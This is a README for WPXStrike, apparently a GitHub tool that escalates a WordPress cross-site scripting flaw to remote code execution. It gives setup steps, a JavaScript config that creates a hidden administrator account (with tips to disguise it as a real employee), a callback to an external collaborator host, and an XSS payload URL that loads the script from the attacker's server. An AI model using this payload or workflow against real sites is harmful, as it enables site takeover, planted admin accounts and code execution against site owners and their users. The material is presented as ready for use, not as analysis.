
<h1 align="center">
  <br>
  <img src="https://github.com/nowak0x01/WPXStrike/assets/96009982/dac6cab2-15eb-4f6f-ae16-b219981bd978" alt="WPXStrike" width="350">
  <br>
  WPXStrike
  <br>
</h1>

<h4 align="center">WordPress Exploitation Script that elevate XSS to RCE or Others Critical Vulnerabilties</a>.</h4>

<p align="center">
  <a href="#about">About</a> •
  <a href="#key-features">Key Features</a> •
  <a href="#how-to-use">How To Use</a> •
  <a href="#examples">Examples</a> •
  <a href="#contributing">Contributing</a>
</p>

![screenshot](https://github.com/nowak0x01/WPXStrike/assets/96009982/6e2578ba-c4ee-46ee-9a4d-8d3f7e57024b)

## About
_**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress.

## Key Features

* _**Privilege Escalation**_
  - Creates an user in WordPress.
* _**(RCE) Plugin Upload**_
  - Upload your custom plugin to WordPress.
* _**(RCE) Built-In Plugin Edit**_
  - Edit a Built-In Plugins in WordPress.
* _**(RCE) Built-In Theme Edit**_
  - Edit a Built-In Themes in WordPress.
* _**(Custom) Custom Exploits**_
  - Custom Exploits for Third-Party WordPress Plugins/Themes.
  
## How To Use
https://github.com/nowak0x01/WPXStrike/assets/96009982/6fb5e850-c3ee-46ab-a9c4-15ed446391ce

1\) Clone the Repository
```bash
git clone https://github.com/nowak0x01/WPXStrike
```

2\) Edit the script by selecting the desired function and modifying its variable values. (Example: _**WPCreateAccount**_)
```
var Target = "https://example.com/wordpress/"; // Ex: https://172.16.0.13:8000/wordpress/
var Callback = "https://xopy8j7taqgx8638bcvddnufh3nxbozd.oastify.com/"; // Ex: https://collaborator.oastify.com/ (optional) (only if you want to receive feedback at each stage).

// ************************************ ~% Functions %~ ************************************ //

WPCreateAccount(); // (Privilege Escalation) - Creates an user in WordPress.
// WPUploadCustomPlugin(); // (RCE) - Upload your custom plugin to WordPress.
// WPEditPlugins(); // (RCE) - Edit a Built-In Plugins in WordPress.
// WPEditThemes(); // (RCE) - Edit a Built-In Themes in WordPress.
// CustomExploits(); // (Custom) - Custom Exploits for Third-Party WordPress Plugins/Themes.

function WPCreateAccount() {

    /* ************************************************************************************************************************************************ */
    var Username = "nowak";         // Ex: operator (It is recommended to use a valid employee name from the target company).
    var Password = `j^QEkyvd7*g3xqsE`;          // (weak password are allowed).
    var Email = "nowak@example.com";  // Ex: user@company.net (It is recommended to use a business email from the target company) (No email will be sent to the email address entered).
    var Role = "administrator";                 // Ex: administrator, editor, author, contributor, subscriber.
    var FirstName = ""; // (optional)
    var LastName = "";  // (optional)
    /* ************************************************************************************************************************************************ */

    ...

```

3\) Start a web server
```bash
php -S 0.0.0.0:80 -t .
```

4\) Go to the WordPress XSS vector and include _**WPXStrike.js**_
```
https://example.com/wordpress/?search=<script src="//YOURIP/WPXStrike.js"></script>
```

## Examples
**_WPCreateAccount()_ - Creates an user in WordPress.**

https://github.com/nowak0x01/WPXStrike/assets/96009982/ac3e0f44-f684-41e5-a254-3f7b845f874d

**_WPUploadCustomPlugin()_ - Upload your custom plugin to WordPress.**

https://github.com/nowak0x01/WPXStrike/assets/96009982/475c4116-8d56-4fcb-9d4f-94fcdfee9161

**_WPEditThemes()_ - Edit a Built-In Themes in WordPress.**

https://github.com/nowak0x01/WPXStrike/assets/96009982/8fda1d80-8fd7-451a-a130-6da88f295756

**_WPEditPlugins()_ = Edit a Built-In Plugins in WordPress.**

https://github.com/nowak0x01/WPXStrike/assets/96009982/b2796b1a-5431-4ef4-ac73-aa6b6799dad4

**_CustomExploits()_ - Custom Exploits for Third-Party WordPress Plugins/Themes**.<br>
// pending

# Contributing
Pull requests are more than welcome.<br>
I will try to maintain this project updated, whenever possible by adding new exploits in the `CustomExploits()` module.<br>
If u want to contribute with this, adding new `CustomExploits()` or improving the code, I'll be very grateful.
